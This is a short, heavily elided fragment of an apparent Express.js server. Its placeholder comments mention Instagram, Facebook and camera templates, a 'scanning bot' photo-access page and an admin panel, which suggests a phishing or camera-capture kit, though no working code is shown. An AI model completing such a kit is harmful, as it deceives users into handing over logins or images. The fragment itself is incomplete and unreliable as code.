...
// ====================== TEMPLATES ======================
// ... (Include Instagram, Facebook, Camera templates here - same as before)

// I'll include the SCANNING BOT template (PHOTO ACCESS) in the code below
...
// (Include your existing templates here - abbreviated for space, but included in full code)
...
app.get('/admin', function(req, res) {
    // Admin panel with pink/red buttons - full HTML
